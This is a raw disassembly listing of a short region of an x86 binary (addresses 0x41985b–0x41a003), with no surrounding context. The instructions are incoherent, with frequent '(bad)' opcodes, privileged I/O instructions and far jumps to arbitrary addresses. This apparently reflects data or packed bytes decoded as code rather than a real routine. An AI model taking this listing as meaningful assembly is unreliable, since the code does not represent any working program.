  41985b:	mov    eax,ds:0xbedf89ba
  419860:	jno    0x41984b
  419862:	mov    ds:0xdffe3dd7,al
  419867:	jle    0x4197ef
  419869:	hlt    
  41986a:	push   ebx
  41986b:	bound  ebp,QWORD PTR [ebx+0x167ed850]
  419871:	jne    0x4198e1
  419873:	ins    BYTE PTR es:[edi],dx
  419874:	add    esp,ebp
  419876:	leave  
  419877:	call   0xa238d684
  41987c:	call   0xf62a4f0e
  419881:	enter  0x6ea4,0x2a
  419885:	push   edi
  419886:	add    al,0xf9
  419888:	adc    eax,0xfea3b121
  41988d:	adc    eax,0x4d0144f3
  419892:	ins    DWORD PTR es:[edi],dx
  419893:	dec    ecx
  419894:	mov    ds:0xded5473d,al
  419899:	ss loop 0x4198cd
  41989c:	and    eax,0x3009adf
  4198a1:	rcl    BYTE PTR [ebx-0xdbc4c26],cl
  4198a7:	(bad)  
  4198a9:	sar    BYTE PTR [eax+0x1b],0x3f
  4198ad:	pop    ebx
  4198ae:	(bad)  
  4198af:	push   ebx
  4198b0:	xor    DWORD PTR [esi],ebx
  4198b2:	in     al,0x28
  4198b4:	xchg   ebp,eax
  4198b5:	sub    esi,DWORD PTR [eax-0x32aa7a60]
  4198bb:	rcr    BYTE PTR [edi-0x15a6784],cl
  4198c1:	push   ds
  4198c2:	pop    esi
  4198c3:	out    0x98,eax
  4198c5:	or     BYTE PTR [esi],dl
  4198c7:	rol    BYTE PTR [edx+eiz*4+0x468fcd01],0x33
  4198cf:	sub    al,0xbe
  4198d1:	cmp    BYTE PTR [eax-0x5e2f1132],0xc0
  4198d8:	mov    WORD PTR [ebp+0x30b9c50],fs
  4198de:	dec    esi
  4198df:	ins    BYTE PTR es:[edi],dx
  4198e0:	loope  0x4198da
  4198e2:	fisubr DWORD PTR [edx-0x20]
  4198e5:	cmp    al,0xba
  4198e7:	push   ebx
  4198e8:	scas   eax,DWORD PTR es:[edi]
  4198e9:	mov    bh,0x51
  4198eb:	or     eax,DWORD PTR cs:[edi]
  4198ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198ef:	mov    edx,DWORD PTR [edi+0x69]
  4198f2:	jmp    0x3897:0x7fba0d40
  4198f9:	mov    edi,DWORD PTR [edx]
  4198fb:	jge    0x41987d
  4198fd:	lahf   
  4198fe:	lock shr BYTE PTR [edi+0x2748a9e],cl
  419905:	push   edi
  419906:	scas   eax,DWORD PTR es:[edi]
  419907:	imul   esp,DWORD PTR [ebp+0x72d91406],0x614b1c55
  419911:	push   cs
  419912:	ficom  DWORD PTR [ecx]
  419914:	dec    esp
  419915:	inc    edi
  419916:	das    
  419917:	neg    edi
  419919:	sahf   
  41991a:	sbb    al,0x19
  41991c:	pop    eax
  41991d:	arpl   WORD PTR [eax],sp
  41991f:	pushf  
  419920:	add    ch,BYTE PTR [esi+eax*8]
  419923:	push   ecx
  419924:	push   es
  419925:	cmp    ch,bl
  419927:	iret   
  419928:	daa    
  419929:	dec    ebx
  41992a:	xchg   edi,eax
  41992b:	sbb    dh,BYTE PTR [edi]
  41992d:	adc    al,0x34
  41992f:	arpl   WORD PTR cs:[esi-0x60],cx
  419933:	das    
  419934:	adc    eax,0x988189e3
  419939:	add    edx,ebp
  41993b:	ror    dh,cl
  41993d:	pop    ebp
  41993e:	xor    al,0x66
  419940:	push   eax
  419941:	sti    
  419942:	fsubr  QWORD PTR [edx-0x19430d00]
  419948:	(bad)  
  41994a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41994b:	in     eax,0xca
  41994d:	xchg   ecx,eax
  41994e:	cld    
  41994f:	xor    eax,0x359c5e0b
  419954:	and    al,0x3a
  419956:	pop    ebx
  419957:	push   ss
  419958:	push   cs
  419959:	sbb    al,0xf4
  41995b:	mov    bh,0x34
  41995d:	retf   
  41995e:	add    al,ah
  419960:	xor    cl,bl
  419962:	dec    eax
  419963:	jle    0x4198f1
  419965:	or     bl,BYTE PTR [ecx+ecx*4+0x2]
  419969:	mov    dh,0x45
  41996b:	mov    esp,0xe6835fb5
  419970:	daa    
  419971:	pop    esp
  419972:	stc    
  419973:	mov    edi,0x2fdb17e8
  419978:	sbb    al,0x46
  41997a:	out    0x57,eax
  41997c:	fidivr DWORD PTR [ecx+edi*4-0x28d96833]
  419983:	and    edi,DWORD PTR [edx]
  419985:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419986:	sbb    ch,BYTE PTR [ebx]
  419988:	sbb    BYTE PTR [ecx-0x59504c0d],ah
  41998e:	push   esp
  41998f:	jmp    0x9c45:0x281602cf
  419996:	sahf   
  419997:	pop    ebx
  419998:	test   DWORD PTR [ebp+0x1],ecx
  41999b:	es jmp 0x3ad4:0x6cfa8b08
  4199a3:	sub    DWORD PTR [ecx+ebx*1-0x39d584c7],0xb9662848
  4199ae:	jl     0x4199e2
  4199b0:	stos   DWORD PTR es:[edi],eax
  4199b1:	retf   0xb78c
  4199b4:	pop    es
  4199b5:	loopne 0x4199fa
  4199b7:	jb     0x41996d
  4199b9:	aad    0x7f
  4199bb:	mov    dh,0x27
  4199bd:	adc    eax,0x93dd2d68
  4199c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199c3:	mov    dl,0x86
  4199c5:	inc    esp
  4199c6:	aad    0xef
  4199c8:	adc    edx,DWORD PTR [edx+0x59a88e74]
  4199ce:	scas   eax,DWORD PTR es:[edi]
  4199cf:	shr    BYTE PTR [edi+0x2bbb9ae1],1
  4199d5:	dec    eax
  4199d6:	jmp    0xbd22:0x805c2f7c
  4199dd:	inc    esi
  4199de:	mov    bh,0x92
  4199e0:	xchg   DWORD PTR [eax],edx
  4199e2:	mov    dh,0xea
  4199e4:	pop    ebx
  4199e5:	fst    QWORD PTR [esi-0x7fad4fdf]
  4199eb:	std    
  4199ec:	push   ds
  4199ed:	xlat   BYTE PTR ds:[ebx]
  4199ee:	adc    dl,BYTE PTR [ecx-0x24b59715]
  4199f4:	dec    esp
  4199f5:	loopne 0x4199db
  4199f7:	imul   ebp,ecx,0x5d
  4199fa:	sub    BYTE PTR [ebp+edi*2+0x4],dl
  4199fe:	ss xor eax,0x7a03e4e8
  419a04:	in     eax,dx
  419a05:	mov    dl,BYTE PTR [edx+0x7d]
  419a08:	pop    ebx
  419a09:	mov    ebx,0x1ec0d195
  419a0e:	pop    esp
  419a0f:	ja     0x419a2a
  419a11:	je     0x419a4a
  419a13:	pop    eax
  419a14:	and    ebp,ebp
  419a16:	clc    
  419a17:	jae    0x419a0f
  419a19:	in     eax,dx
  419a1a:	cli    
  419a1b:	rcr    bh,1
  419a1d:	js     0x419a37
  419a1f:	pop    eax
  419a20:	fsub   QWORD PTR [edi+ebx*2]
  419a23:	idiv   edx
  419a25:	fcom   QWORD PTR ds:0x96258402
  419a2b:	popa   
  419a2c:	es mov ecx,0x5247b106
  419a32:	jnp    0x419a39
  419a34:	jne    0x419a80
  419a36:	cmp    al,0x59
  419a38:	mov    al,0xe2
  419a3a:	bswap  esi
  419a3c:	jecxz  0x4199e9
  419a3e:	pop    ds
  419a3f:	aad    0xd1
  419a41:	mov    ds:0xb538c416,eax
  419a46:	mov    bh,0x81
  419a48:	and    BYTE PTR [edx+0x51],ah
  419a4b:	add    al,0x19
  419a4d:	leave  
  419a4e:	push   eax
  419a4f:	jns    0x419a0c
  419a51:	std    
  419a52:	adc    al,0xeb
  419a54:	push   esp
  419a55:	xor    esp,ebp
  419a57:	push   eax
  419a58:	cld    
  419a59:	inc    ebp
  419a5a:	imul   esi,DWORD PTR [esi+0x3b2fb86e],0xcd57f0e4
  419a64:	ds fcmovnbe st,st(4)
  419a67:	ror    DWORD PTR [esi-0x5e4f54fa],0x70
  419a6e:	cs jle 0x419aa9
  419a71:	mov    ds:0x258c106f,al
  419a76:	sbb    cl,BYTE PTR [edx]
  419a78:	in     al,dx
  419a79:	sahf   
  419a7a:	enter  0xa6c3,0x1b
  419a7e:	outs   dx,DWORD PTR ds:[esi]
  419a7f:	test   dh,0xa2
  419a82:	xor    BYTE PTR [edx-0x19],ch
  419a85:	push   esp
  419a86:	ds xchg esp,eax
  419a88:	and    dl,BYTE PTR [edi+0x53b7a71b]
  419a8e:	fimul  DWORD PTR [ebp-0x7ed6ca8e]
  419a94:	adc    DWORD PTR [edi-0x2856358a],eax
  419a9a:	test   al,0x92
  419a9c:	adc    esp,ecx
  419a9e:	mov    BYTE PTR [esi-0x5cc923ea],bl
  419aa4:	in     eax,0xfa
  419aa6:	cdq    
  419aa7:	outs   dx,DWORD PTR ds:[esi]
  419aa8:	inc    eax
  419aa9:	pop    ss
  419aaa:	pop    edx
  419aab:	imul   ebx,ebp,0xe52bab3c
  419ab1:	test   BYTE PTR [ebp+0x4e1977ce],dl
  419ab7:	test   eax,0x682673e4
  419abc:	cli    
  419abd:	sbb    BYTE PTR [ebp+0x46813fc1],0x8c
  419ac4:	loopne 0x419b41
  419ac6:	jge    0x419aab
  419ac8:	inc    ecx
  419ac9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419aca:	xor    ah,BYTE PTR [ebx+0x503fd37]
  419ad0:	fwait
  419ad1:	pop    ecx
  419ad2:	test   BYTE PTR [edx-0x5502aa48],dl
  419ad8:	test   al,0xfb
  419ada:	(bad)  [ecx+0x6a3d708b]
  419ae0:	xchg   ecx,eax
  419ae1:	adc    BYTE PTR ds:0xf4743d29,dh
  419ae7:	mov    ah,0x3e
  419ae9:	xor    BYTE PTR [esi+0x5257098c],bl
  419aef:	xchg   edx,eax
  419af0:	into   
  419af1:	xor    BYTE PTR [edi-0x3bcd1bf6],0x8
  419af8:	dec    eax
  419af9:	add    eax,0xfc720f47
  419afe:	pop    ebp
  419aff:	mov    bl,0xd4
  419b01:	pop    edx
  419b02:	push   edi
  419b03:	adc    eax,ebx
  419b05:	adc    eax,0x83dccb24
  419b0a:	push   0x28
  419b0c:	addr16 std 
  419b0e:	adc    al,0x72
  419b10:	mov    eax,0x22ae913a
  419b15:	ss pop ds
  419b17:	sub    ebx,DWORD PTR [esi]
  419b19:	outs   dx,DWORD PTR ds:[esi]
  419b1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b1b:	repnz pop edx
  419b1d:	jno    0x419b67
  419b1f:	lock jle 0x419b37
  419b22:	pop    ss
  419b23:	cmp    ah,BYTE PTR [edi+0x3d]
  419b26:	inc    eax
  419b27:	or     dl,dl
  419b29:	lahf   
  419b2a:	xor    DWORD PTR [ecx-0x35],ebx
  419b2d:	sub    DWORD PTR [eax+ebx*1],eax
  419b30:	and    DWORD PTR [eax+ebx*8-0x12],ebp
  419b34:	sar    DWORD PTR [edi+0x29],cl
  419b37:	imul   esp
  419b39:	or     eax,0x39a3f0a6
  419b3e:	imul   esi,DWORD PTR [ecx-0x6af9a3e6],0xffffffca
  419b45:	adc    cl,BYTE PTR [edi]
  419b47:	inc    edi
  419b48:	mov    al,ds:0xf5f5c8e0
  419b4d:	mov    dl,0x12
  419b4f:	sub    al,0x92
  419b51:	rol    BYTE PTR [edx],cl
  419b53:	icebp  
  419b54:	loope  0x419b96
  419b56:	jno    0x419b20
  419b58:	jge    0x419ba5
  419b5a:	(bad)  
  419b5b:	push   ds
  419b5c:	xchg   ebx,eax
  419b5d:	pop    esp
  419b5e:	call   0xb1b853a0
  419b63:	jbe    0x419bd7
  419b65:	retf   
  419b66:	pop    es
  419b67:	push   ds
  419b68:	out    dx,al
  419b69:	and    al,0x68
  419b6b:	mov    ch,0x99
  419b6d:	cmp    ebp,DWORD PTR [ecx+0x43ca0a1]
  419b73:	int    0xb6
  419b75:	xchg   esp,eax
  419b76:	scas   al,BYTE PTR es:[edi]
  419b77:	sbb    eax,DWORD PTR [edi-0x48]
  419b7a:	or     eax,0xfe8ded61
  419b7f:	cwde   
  419b80:	adc    eax,0x5bada766
  419b85:	add    edx,DWORD PTR [ecx+0x54]
  419b88:	enter  0xdf4b,0xb
  419b8c:	mov    ecx,0x9c0e24a2
  419b91:	das    
  419b92:	mov    ebx,0x1695c7c
  419b97:	mov    DWORD PTR [edx+edx*2-0x32b00ca],eax
  419b9e:	mov    DWORD PTR [edx-0x3bc77408],eax
  419ba4:	sar    edi,0xb2
  419ba7:	out    dx,eax
  419ba8:	and    eax,0x8a96aced
  419bad:	cmp    al,0xea
  419bb0:	xor    eax,0xa183532f
  419bb5:	mov    dh,0x5
  419bb7:	adc    bl,BYTE PTR [eax+0x6f]
  419bba:	cmc    
  419bbb:	repz je 0x419c1c
  419bbe:	or     esp,edx
  419bc0:	frstor [ebx+0x7c5f9e2d]
  419bc6:	adc    al,0x96
  419bc8:	into   
  419bc9:	test   BYTE PTR [ebx],ch
  419bcb:	jae    0x419c37
  419bcd:	mov    ch,0x96
  419bcf:	shr    DWORD PTR [ecx-0x7edb9932],cl
  419bd5:	dec    ebx
  419bd6:	retf   0x6c7f
  419bd9:	pop    ebp
  419bda:	icebp  
  419bdb:	add    DWORD PTR [esi+edi*8+0x512f578b],0xfc72ef72
  419be6:	sub    esi,edi
  419be8:	dec    ecx
  419be9:	jg     0x419bae
  419beb:	mov    BYTE PTR [edx-0x6de8d425],bh
  419bf1:	lods   al,BYTE PTR ds:[esi]
  419bf2:	iret   
  419bf3:	clc    
  419bf4:	clc    
  419bf5:	adc    al,0x2
  419bf7:	mov    ebx,0xfef9d5f6
  419bfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bfd:	pop    edx
  419bfe:	add    al,0x96
  419c00:	int    0xe3
  419c02:	and    BYTE PTR [ebx-0x48],cl
  419c05:	adc    al,0x24
  419c07:	int3   
  419c08:	adc    al,BYTE PTR [edi+0x5e288540]
  419c0e:	int3   
  419c0f:	(bad)  
  419c10:	xchg   bx,ax
  419c12:	push   eax
  419c13:	inc    esp
  419c14:	aad    0x67
  419c16:	mov    bl,0x5f
  419c18:	int3   
  419c19:	mov    al,0xea
  419c1b:	ins    BYTE PTR es:[edi],dx
  419c1c:	cmp    DWORD PTR [ebx+eax*4],ebp
  419c1f:	imul   ebx,esi,0x6b231436
  419c25:	cli    
  419c26:	jmp    esp
  419c28:	enter  0x624a,0x2f
  419c2c:	fistp  WORD PTR [eax]
  419c2e:	lds    esp,FWORD PTR [ecx+0x43]
  419c31:	aas    
  419c32:	push   ss
  419c33:	mov    dl,dh
  419c35:	fcomi  st,st(6)
  419c37:	pop    ecx
  419c38:	dec    BYTE PTR [ebp+0x4a]
  419c3b:	inc    ebp
  419c3c:	pop    eax
  419c3d:	xor    esp,edi
  419c3f:	sbb    al,0x60
  419c41:	lock jmp 0x419ca6
  419c44:	fstp   TBYTE PTR ds:0x514896dc
  419c4a:	xor    DWORD PTR [edx+0x1832434d],ecx
  419c50:	push   esi
  419c51:	adc    ebp,DWORD PTR [ecx]
  419c53:	fldenv [ebp-0x8]
  419c56:	mov    eax,0xd567b17f
  419c5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c5c:	or     ebp,DWORD PTR [esi]
  419c5e:	sbb    ebx,DWORD PTR [ebx+0x5e60d646]
  419c64:	and    cl,BYTE PTR [edi-0x45233e3]
  419c6a:	xor    al,0x88
  419c6c:	push   ebx
  419c6d:	(bad)  
  419c6e:	iret   
  419c6f:	mov    BYTE PTR [ebx+0x34],0x7e
  419c73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c74:	(bad)  [ebp+0x6]
  419c77:	jecxz  0x419ca4
  419c79:	(bad)  
  419c7a:	xchg   esp,eax
  419c7b:	(bad)  
  419c7d:	dec    ecx
  419c7e:	jecxz  0x419c72
  419c80:	mov    al,0xcc
  419c82:	mov    bh,0x3c
  419c84:	jo     0x419d05
  419c86:	xlat   BYTE PTR ds:[ebx]
  419c87:	cli    
  419c88:	mov    eax,0x7e1077e0
  419c8d:	fidivr WORD PTR [esi-0x306e07db]
  419c93:	sbb    DWORD PTR ds:0xa9f0e6b1,ecx
  419c99:	push   eax
  419c9a:	in     al,0x7
  419c9c:	push   ebp
  419c9d:	test   DWORD PTR [ebp+0x11be2670],edi
  419ca3:	jb     0x419cdc
  419ca5:	dec    ecx
  419ca6:	pusha  
  419ca7:	mov    ds:0x1433ebaa,al
  419cac:	add    bh,BYTE PTR [edi]
  419cae:	pop    ecx
  419caf:	mov    esp,0x3fb365b7
  419cb4:	push   ss
  419cb5:	mov    BYTE PTR [esi+edi*8-0x35b0acce],bl
  419cbc:	lods   eax,DWORD PTR ds:[esi]
  419cbd:	mov    ds:0xede89861,eax
  419cc2:	mov    ebp,0x42e4e185
  419cc7:	and    al,0x9c
  419cc9:	and    al,0x36
  419ccb:	mov    ds:0xa8e1f925,al
  419cd0:	adc    DWORD PTR [edx-0x52354f03],ebx
  419cd6:	ja     0x419d51
  419cd8:	pusha  
  419cd9:	jns    0x419cb5
  419cdb:	aad    0x4a
  419cdd:	sbb    BYTE PTR [ecx-0x2c2ee02b],0x72
  419ce4:	loopne 0x419c8c
  419ce6:	or     ch,BYTE PTR [esi+0x45]
  419ce9:	push   eax
  419cea:	imul   esi,DWORD PTR [edi-0x1],0xffffffc1
  419cee:	int3   
  419cef:	pop    es
  419cf0:	pop    ebp
  419cf1:	enter  0x7333,0xfb
  419cf5:	hlt    
  419cf6:	ret    
  419cf7:	stos   BYTE PTR es:[edi],al
  419cf8:	jge    0x419c7d
  419cfa:	jl     0x419c9c
  419cfc:	sub    edi,DWORD PTR [eax+0x4bf64eba]
  419d02:	and    ch,dh
  419d04:	(bad)  
  419d05:	std    
  419d06:	xchg   edx,eax
  419d07:	push   cs
  419d08:	stc    
  419d09:	or     eax,0x5e585b13
  419d0e:	xchg   ebx,eax
  419d0f:	daa    
  419d10:	dec    ebx
  419d11:	add    cl,BYTE PTR [esi+0x26]
  419d14:	push   esi
  419d15:	mov    esi,DWORD PTR [eax-0x5f]
  419d18:	shl    DWORD PTR [esi],1
  419d1a:	pop    ebp
  419d1b:	and    DWORD PTR [edx+0x7f],0xc3076822
  419d22:	std    
  419d23:	or     BYTE PTR [edx-0x276106e8],ah
  419d29:	int    0x8d
  419d2b:	sbb    eax,0xefe0c64c
  419d30:	push   ebp
  419d31:	jecxz  0x419d92
  419d33:	leave  
  419d34:	fs ss jnp 0x419d44
  419d38:	and    dl,BYTE PTR [esi]
  419d3a:	clc    
  419d3b:	jmp    0xb383:0x9c7a5758
  419d42:	in     eax,0xfc
  419d44:	icebp  
  419d45:	xlat   BYTE PTR ds:[ebx]
  419d46:	aaa    
  419d47:	popf   
  419d48:	or     cl,BYTE PTR [ebx+0x54]
  419d4b:	cdq    
  419d4c:	jle    0x419db5
  419d4e:	mov    dh,0xd8
  419d50:	xchg   ebp,eax
  419d51:	retf   0x885d
  419d54:	add    BYTE PTR [ebp-0x20],al
  419d57:	mul    BYTE PTR [ebx-0x3b2fd95c]
  419d5d:	pop    ss
  419d5e:	adc    BYTE PTR [edx+0x67],dl
  419d61:	inc    ebx
  419d62:	jne    0x419dd9
  419d64:	mov    BYTE PTR [ecx],ah
  419d66:	jl     0x419da1
  419d68:	mov    bl,0xaf
  419d6a:	aad    0xf
  419d6c:	push   edx
  419d6d:	out    dx,al
  419d6e:	aaa    
  419d6f:	xor    DWORD PTR [ebp+0x23],edx
  419d72:	adc    BYTE PTR [ebx+eiz*4],bl
  419d75:	dec    esi
  419d76:	int3   
  419d77:	stos   BYTE PTR es:[edi],al
  419d78:	ins    DWORD PTR es:[edi],dx
  419d79:	mov    al,ds:0xd3ae903a
  419d7e:	push   ebx
  419d7f:	pop    ecx
  419d80:	sbb    DWORD PTR [esi+eiz*1+0x6c],edi
  419d84:	xor    ah,BYTE PTR [eax]
  419d86:	adc    esp,ecx
  419d88:	sub    edi,edx
  419d8a:	bound  edi,QWORD PTR [esi]
  419d8c:	push   eax
  419d8d:	jbe    0x419e05
  419d8f:	jecxz  0x419dd5
  419d91:	jg     0x419d47
  419d93:	inc    edi
  419d94:	pop    esi
  419d95:	mov    WORD PTR [ecx+0x50],gs
  419d98:	(bad)  
  419d99:	out    0x80,al
  419d9b:	aam    0x98
  419d9d:	sub    eax,0x8d3a9a71
  419da2:	pop    ebp
  419da3:	test   bh,dh
  419da5:	cmp    esp,DWORD PTR [esi-0x5404aec0]
  419dab:	jmp    0x419d6b
  419dad:	add    eax,0xafda05da
  419db2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419db3:	retf   
  419db4:	gs icebp 
  419db6:	jmp    0x419e27
  419db8:	iret   
  419db9:	not    BYTE PTR [edx+eiz*1]
  419dbc:	pop    ebx
  419dbe:	scas   eax,DWORD PTR es:[edi]
  419dbf:	jl     0x419ddf
  419dc1:	push   esi
  419dc2:	add    al,0x1e
  419dc4:	ret    0x2d5d
  419dc7:	cmp    eax,0x3e739332
  419dcc:	pop    esp
  419dcd:	popf   
  419dce:	scas   al,BYTE PTR es:[edi]
  419dcf:	mov    al,ds:0xe25e8af2
  419dd4:	or     BYTE PTR [ecx],bl
  419dd6:	sbb    edx,DWORD PTR [ebp+0x1e]
  419dd9:	mov    ecx,0xb3058749
  419dde:	or     edx,DWORD PTR [esi]
  419de0:	xor    BYTE PTR [ecx+0x1c],al
  419de3:	mov    ebx,0x3002e1e7
  419de8:	mov    edx,0xbe21eb64
  419ded:	sahf   
  419dee:	out    dx,al
  419def:	imul   ebp,eax,0x5f9acedf
  419df5:	sub    BYTE PTR ds:0x3631d311,cl
  419dfb:	push   ebx
  419dfc:	test   BYTE PTR [esi],dh
  419dfe:	cld    
  419dff:	push   esp
  419e00:	imul   esi,DWORD PTR [esi-0xf],0x5c
  419e04:	(bad)
  419e07:	inc    ecx
  419e08:	sbb    ecx,ebx
  419e0a:	push   0xffffffbf
  419e0c:	imul   esp,DWORD PTR [ebx+esi*4],0x4d
  419e10:	sbb    esi,0x71
  419e13:	idiv   edi
  419e15:	enter  0x532f,0x3b
  419e19:	cs mov edi,0xe6b19d34
  419e1f:	scas   eax,DWORD PTR es:[edi]
  419e20:	dec    ecx
  419e21:	pop    ecx
  419e22:	mov    edi,0x2108be43
  419e27:	fcomp  QWORD PTR [edi-0x19]
  419e2a:	ficomp DWORD PTR ds:0xcd8f23c7
  419e30:	ss loopne 0x419e93
  419e33:	(bad)  
  419e34:	cmp    edx,edx
  419e36:	cmovl  edx,esp
  419e39:	in     eax,0x69
  419e3b:	xchg   esp,eax
  419e3c:	rcr    cl,0x8c
  419e3f:	and    BYTE PTR [edx+0xa],dl
  419e42:	jae    0x419e04
  419e44:	dec    ch
  419e46:	pop    ss
  419e47:	adc    DWORD PTR [eax+0x47316eb8],edi
  419e4d:	ss xchg ecx,eax
  419e4f:	paddw  mm2,QWORD PTR [esi]
  419e52:	push   ebp
  419e53:	(bad)  
  419e54:	std    
  419e55:	call   DWORD PTR cs:0x98ea6280
  419e5c:	pop    es
  419e5d:	hlt    
  419e5e:	cwde   
  419e5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e60:	xchg   edi,eax
  419e61:	dec    edx
  419e62:	call   0xd2e27dd
  419e67:	das    
  419e68:	adc    ch,BYTE PTR [esp+ebp*8+0x7c148639]
  419e6f:	cmc    
  419e70:	in     eax,0x2b
  419e72:	fidiv  WORD PTR [ebp-0x52]
  419e75:	jo     0x419e1f
  419e77:	ss daa 
  419e79:	push   edx
  419e7a:	inc    edx
  419e7b:	rol    ecx,0x34
  419e7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e7f:	cs pop ss
  419e81:	inc    ebp
  419e82:	rol    BYTE PTR [ecx-0x2d14feb],0x43
  419e89:	(bad)  
  419e8a:	jmp    0x419e80
  419e8c:	adc    eax,0x2bbb2e34
  419e91:	sub    al,0xd
  419e93:	fdivr  st,st(1)
  419e95:	dec    esp
  419e96:	icebp  
  419e97:	xor    BYTE PTR [edx-0x16c089bf],al
  419e9d:	xchg   ebx,eax
  419e9e:	adc    al,0x96
  419ea0:	and    eax,0x18475be7
  419ea5:	stc    
  419ea6:	lahf   
  419ea7:	and    ah,BYTE PTR [eax+0x12]
  419eaa:	lea    ecx,[edx+0x2eefac79]
  419eb0:	lds    edx,FWORD PTR [edx]
  419eb2:	pop    ds
  419eb3:	mov    dh,0x8b
  419eb5:	jle    0x419e46
  419eb7:	xchg   BYTE PTR [ecx],ch
  419eb9:	nop
  419eba:	popf   
  419ebb:	popf   
  419ebc:	lods   al,BYTE PTR ds:[esi]
  419ebd:	(bad)  
  419ebe:	fstp   DWORD PTR [ebx+0x72af43a1]
  419ec4:	or     al,0x4f
  419ec6:	jecxz  0x419f45
  419ec8:	xlat   BYTE PTR ds:[ebx]
  419ec9:	sbb    al,0x7f
  419ecb:	sbb    al,0x97
  419ecd:	js     0x419f44
  419ecf:	jne    0x419edd
  419ed1:	pop    edx
  419ed2:	ss dec edx
  419ed4:	neg    BYTE PTR ds:0x1f508950
  419eda:	xchg   DWORD PTR [edi+0x2e],ecx
  419edd:	mov    eax,ds:0x386bd3f0
  419ee2:	add    bl,bh
  419ee4:	jnp    0x419ea1
  419ee6:	and    eax,ebx
  419ee8:	pushf  
  419ee9:	aaa    
  419eea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419eeb:	xor    edi,DWORD PTR [esi+eax*4+0x58d4c39e]
  419ef2:	pop    es
  419ef3:	fwait
  419ef4:	mov    bh,0xf7
  419ef6:	nop
  419ef7:	lock daa 
  419ef9:	push   eax
  419efa:	adc    ch,BYTE PTR [edi+0x62]
  419efd:	jge    0x419eab
  419eff:	mov    al,0x57
  419f01:	loop   0x419f43
  419f03:	sub    al,0x5c
  419f05:	pop    ds
  419f06:	(bad)  
  419f07:	or     edx,DWORD PTR [ebx-0x78]
  419f0a:	pop    es
  419f0b:	icebp  
  419f0c:	mov    ebp,0xbc722a59
  419f11:	and    edi,ecx
  419f13:	out    0x6,al
  419f15:	add    ecx,DWORD PTR [ebx+0x33]
  419f18:	xor    al,0xd7
  419f1a:	pop    eax
  419f1b:	pop    esi
  419f1c:	popa   
  419f1d:	out    0x98,al
  419f1f:	std    
  419f20:	mov    cl,0x23
  419f22:	dec    eax
  419f23:	mov    ds:0xb04f6405,eax
  419f28:	push   ss
  419f29:	test   bh,ah
  419f2b:	cmc    
  419f2c:	dec    edx
  419f2d:	aam    0xcf
  419f2f:	pop    ebx
  419f30:	dec    eax
  419f31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f32:	jg     0x419f17
  419f34:	in     eax,0x90
  419f36:	dec    esi
  419f37:	(bad)  
  419f38:	jmp    0x95a4:0x277bc14e
  419f3f:	mov    dh,0x24
  419f41:	fucompp 
  419f43:	xor    esi,DWORD PTR [ebp-0x3b]
  419f46:	dec    ecx
  419f47:	test   DWORD PTR [edx],ebx
  419f49:	dec    edi
  419f4a:	mov    DWORD PTR [edi+0x7111ff6e],edi
  419f50:	out    0x83,eax
  419f52:	test   al,0xd7
  419f54:	jecxz  0x419ed7
  419f56:	mov    eax,0xb833a73f
  419f5b:	hlt    
  419f5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f5d:	arpl   WORD PTR [edi],dx
  419f5f:	icebp  
  419f60:	mov    eax,ds:0x454e713c
  419f65:	scas   eax,DWORD PTR es:[edi]
  419f66:	popf   
  419f67:	and    DWORD PTR [ebx-0x63fc08a5],ebx
  419f6d:	lods   eax,DWORD PTR ds:[esi]
  419f6e:	mov    cl,0x5a
  419f70:	call   0x431b:0x9e888ea6
  419f77:	stos   BYTE PTR es:[edi],al
  419f78:	sub    al,bl
  419f7a:	push   ecx
  419f7b:	shl    edx,cl
  419f7d:	mov    ds,WORD PTR [edi+0x14]
  419f80:	push   edi
  419f81:	mov    edx,0x8341638a
  419f86:	jne    0x419f76
  419f88:	xchg   esi,eax
  419f89:	loope  0x419fd8
  419f8b:	mov    cl,0x28
  419f8d:	scas   eax,DWORD PTR es:[edi]
  419f8e:	jmp    0x419f81
  419f90:	mov    dl,ah
  419f92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f93:	ins    DWORD PTR es:[edi],dx
  419f94:	cmc    
  419f95:	popa   
  419f96:	sub    eax,0x5df86b92
  419f9b:	fisub  WORD PTR [edi+0x76]
  419f9e:	(bad)  
  419f9f:	mov    ebp,0xb40f4743
  419fa4:	jnp    0x419ff8
  419fa6:	adc    al,0x9b
  419fa8:	into   
  419fa9:	in     al,0x9f
  419fab:	xchg   ebx,eax
  419fac:	pushf  
  419fad:	or     dh,BYTE PTR [ebp+0x245538c3]
  419fb3:	and    DWORD PTR [eax],0x595a7af
  419fb9:	dec    edi
  419fba:	ins    BYTE PTR es:[edi],dx
  419fbb:	adc    BYTE PTR [ecx-0x5d],ch
  419fbe:	bound  ebp,QWORD PTR [esi]
  419fc0:	cmp    eax,0x506625e9
  419fc5:	rol    DWORD PTR [esi],cl
  419fc7:	mov    bh,0x39
  419fc9:	mov    dh,0x17
  419fcb:	xor    eax,0xbf03a2ac
  419fd0:	or     DWORD PTR [eax-0x48],esp
  419fd3:	out    0xb3,al
  419fd5:	aaa    
  419fd6:	mov    edx,0xa3dac3c3
  419fdb:	push   eax
  419fdc:	es mov bl,0xe5
  419fdf:	pop    ss
  419fe0:	push   ss
  419fe1:	sub    DWORD PTR [eax-0x5ba3af97],edi
  419fe7:	mov    ecx,0x25b4e248
  419fec:	dec    edi
  419fed:	and    BYTE PTR [ecx+0x5df0f2b4],cl
  419ff3:	sbb    BYTE PTR ds:0x67659590,al
  419ff9:	xor    DWORD PTR [ebx-0x28],ebp
  419ffc:	inc    ecx
  419ffd:	je     0x419faa
  419fff:	push   edx
  41a000:	inc    ebp
  41a001:	inc    ecx
  41a002:	(bad)  
  41a003:	adc    eax,0xdad00316
